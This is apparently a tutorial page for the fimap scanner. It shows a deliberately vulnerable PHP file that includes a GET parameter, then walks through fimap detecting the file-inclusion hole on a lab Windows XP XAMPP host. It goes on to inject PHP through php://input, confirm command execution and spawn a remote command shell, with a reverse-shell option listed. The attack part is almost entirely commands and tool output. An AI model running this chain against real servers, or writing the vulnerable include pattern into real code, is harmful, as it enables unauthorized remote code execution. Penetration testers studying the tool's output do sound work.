# fimap Windows Attacking Introdution #

## 0. Example PHP Code ##
```
<? include($_GET["super"]); ?>
```

## 1. fimap result for it ##
```
imax@Develb0x:/st0rage/dev/fimap/src$ ./fimap.py -u "http://192.168.178.33/super.php?super=sexy"
fimap v.08_svn by Iman Karim - Automatic LFI/RFI scanner and exploiter
[INFO] 2 plugins loaded.
SingleScan is testing URL: 'http://192.168.178.33/super.php?super=sexy'
[OUT] Parsing URL 'http://192.168.178.33/super.php?super=sexy'...
[INFO] Fiddling around with URL...
[OUT] [PHP] Possible file inclusion found! -> 'http://192.168.178.33/super.php?super=MX8BeYvr' with Parameter 'super'.
[OUT] [PHP] Identifying Vulnerability 'http://192.168.178.33/super.php?super=sexy' with Parameter 'super'...
[INFO] Scriptpath received: 'C:\xampp\htdocs'
[INFO] Operating System is 'Windows'.
[INFO] Testing file 'php://input'...
[INFO] Testing file 'http://www.phpbb.de/index.php'...
#############################################################
#[1] Possible PHP-File Inclusion                            #
#############################################################
#  [URL]      http://192.168.178.33/super.php?super=sexy    #
#  [PARAM]    super                                         #
#  [PATH]     C:\xampp\htdocs                               #
#  [TYPE]     Absolute Clean + Remote injection             #
#  [NULLBYTE] No Need. It's clean.                          #
#  [READABLE FILES]                                         #
#                   [0] php://input                         #
#                   [1] http://www.phpbb.de/index.php       #
#############################################################
```

## 2. Exploiting It ##
```
imax@Develb0x:/st0rage/dev/fimap/src$ python fimap.py -x
fimap v.08_svn by Iman Karim - Automatic LFI/RFI scanner and exploiter
[INFO] 2 plugins loaded.                                              
##################################################################### 
#:: List of Domains ::                                              # 
##################################################################### 
#[1] 192.168.178.33 (Microsoft Windows XP [Version 5.1.2600])       #
#[q] Quit                                                           #
#####################################################################
WARNING: Some domains may be not listed here because dynamic_rfi is not configured!
Choose Domain: 1
#############################################################################################
#:: FI Bugs on '192.168.178.33' ::                                                          #
#############################################################################################
#[1] URL: '/super.php?super=sexy' injecting file: 'php://input' using GET-param: 'super'    #
#[q] Quit                                                                                   #
#############################################################################################
WARNING: Some bugs are suppressed because dynamic_rfi is not configured!
Choose vulnerable script: 1
[INFO] Testing PHP-code injection thru POST...
[OUT] PHP Injection works! Testing if execution works...
[INFO] Testing execution thru 'popen[b64][win]'...
[INFO] Execution thru 'popen[b64][win]' works!
####################################################
#:: Available Attacks - PHP and SHELL access ::    #
####################################################
#[1] Spawn fimap shell                             #
#[2] Spawn pentestmonkey's reverse shell           #
#[q] Quit                                          #
####################################################
Choose Attack: 1
Please wait - Setting up shell (one request)...
-------------------------------------------
Welcome to fimap shell!
Better dont start interactive commands! ;)
Also remember that this is not a persistent shell.
Every command opens a new shell and quits it after that!
Enter 'q' to exit the shell.
-------------------------------------------
fishell@Administrator:C:\xampp\htdocs$> dir
Volume in drive C has no label.
 Volume Serial Number is 3C1B-3B57

 Directory of C:\xampp\htdocs

21.02.2010  05:41    <DIR>          .
21.02.2010  05:41    <DIR>          ..
20.12.2009  00:00                44 index.html
20.12.2009  00:00               256 index.php
21.02.2010  06:51                47 super.php
20.12.2009  00:00    <DIR>          xampp
               3 File(s)            347 bytes
               3 Dir(s)   1.654.738.944 bytes free
fishell@Administrator:C:\xampp\htdocs$> ver
Microsoft Windows XP [Version 5.1.2600]
fishell@Administrator:C:\xampp\htdocs$> q
See ya dude!
Do not forget to close this security hole.
imax@Develb0x:/st0rage/dev/fimap/src$

```